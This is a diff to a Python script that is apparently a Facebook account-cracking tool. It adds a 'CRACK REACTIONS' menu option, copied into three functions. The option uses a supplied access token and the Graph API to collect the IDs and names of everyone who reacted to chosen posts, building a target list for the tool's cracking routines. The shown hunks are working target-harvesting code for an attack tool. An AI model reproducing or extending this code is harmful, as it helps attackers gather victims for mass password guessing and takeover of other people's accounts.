@@ -248,6 +248,7 @@ def crack1():
 	print("")
 	print("\033[92;1m  [1] CRACK PUBLIC ID")
 	print("\033[93;1m  [2] CRACK FOLLOWERS")
+	print("\033[93;1m  [3] CRACK REACTIONS")
 	print("\033[91;1m  [0] BACK")
 	print("")
 	crack_select1()
@@ -298,7 +299,29 @@ def crack_select1():
 					na = i["name"].encode('utf-8')
 					id.append(uid+"|"+na)
 			except KeyError:
-				print("\033[91;1m  PRIVATE FRIEND LIST TRY ANOTHER ONE")
+				print("\033[91;1m  PRIVATE FOLLOWERS, TRY ANOTHER ONE")
+			print("\033[94;1m  TOTAL IDS  : \033[0;92m%s\033[0;97m"%(len(id)))
+		time.sleep(3)
+	elif select =="3":
+		os.system("clear")
+		logo()
+		print("")
+		print("      \033[92;1mMULTI REACTORS ID COINING ")
+		print("")
+		try:
+			id_limit = int(raw_input("\033[93;1m  ENTER LIMIT (\033[91;1m5 MAX\033[93;1m): \033[92;1m"))
+			print("")
+		except:id_limit=1
+		for t in range(id_limit):
+			t +=1
+			idt = raw_input("\033[93;1m  INPUT POST ID (\033[92;1m%s\033[93;1m) : \033[92;1m"%(t))
+			try:
+				for i in requests.get("https://graph.facebook.com/"+idt+"/reactions?access_token="+token+"&limit=999999").json()["data"]:
+					uid = i["id"].encode('utf-8')
+					na = i["name"].encode('utf-8')
+					id.append(uid+"|"+na)
+			except KeyError:
+				print("\033[91;1m  CANNOT SCAN REACTIONS")
 			print("\033[94;1m  TOTAL IDS  : \033[0;92m%s\033[0;97m"%(len(id)))
 		time.sleep(3)
 	elif select =="0":
@@ -667,6 +690,28 @@ def crack_select():
 				print("\033[91;1m  PRIVATE FRIEND LIST TRY ANOTHER ONE")
 			print("\033[94;1m  TOTAL IDS  : \033[0;92m%s\033[0;97m"%(len(id)))
 		time.sleep(3)
+	elif select =="3":
+		os.system("clear")
+		logo()
+		print("")
+		print("      \033[92;1mMULTI REACTORS ID COINING ")
+		print("")
+		try:
+			id_limit = int(raw_input("\033[93;1m  ENTER LIMIT (\033[91;1m5 MAX\033[93;1m): \033[92;1m"))
+			print("")
+		except:id_limit=1
+		for t in range(id_limit):
+			t +=1
+			idt = raw_input("\033[93;1m  INPUT POST ID (\033[92;1m%s\033[93;1m) : \033[92;1m"%(t))
+			try:
+				for i in requests.get("https://graph.facebook.com/"+idt+"/reactions?access_token="+token+"&limit=999999").json()["data"]:
+					uid = i["id"].encode('utf-8')
+					na = i["name"].encode('utf-8')
+					id.append(uid+"|"+na)
+			except KeyError:
+				print("\033[91;1m  CANNOT SCAN REACTIONS")
+			print("\033[94;1m  TOTAL IDS  : \033[0;92m%s\033[0;97m"%(len(id)))
+		time.sleep(3)
 	elif select =="0":
 	    menu()
 	else:
@@ -891,7 +936,29 @@ def crack_select2():
 					na = i["name"].encode('utf-8')
 					id.append(uid+"|"+na)
 			except KeyError:
-				print("\033[91;1m  PRIVATE FRIEND LIST TRY ANOTHER ONE")
+				print("\033[91;1m  PRIVATE FOLLOWERS, TRY ANOTHER ONE")
+			print("\033[94;1m  TOTAL IDS  : \033[0;92m%s\033[0;97m"%(len(id)))
+		time.sleep(3)
+	elif select =="3":
+		os.system("clear")
+		logo()
+		print("")
+		print("      \033[92;1mMULTI REACTORS ID COINING ")
+		print("")
+		try:
+			id_limit = int(raw_input("\033[93;1m  ENTER LIMIT (\033[91;1m5 MAX\033[93;1m): \033[92;1m"))
+			print("")
+		except:id_limit=1
+		for t in range(id_limit):
+			t +=1
+			idt = raw_input("\033[93;1m  INPUT POST ID (\033[92;1m%s\033[93;1m) : \033[92;1m"%(t))
+			try:
+				for i in requests.get("https://graph.facebook.com/"+idt+"/reactions?access_token="+token+"&limit=999999").json()["data"]:
+					uid = i["id"].encode('utf-8')
+					na = i["name"].encode('utf-8')
+					id.append(uid+"|"+na)
+			except KeyError:
+				print("\033[91;1m  CANNOT SCAN REACTIONS")
 			print("\033[94;1m  TOTAL IDS  : \033[0;92m%s\033[0;97m"%(len(id)))
 		time.sleep(3)
 	elif select =="0":
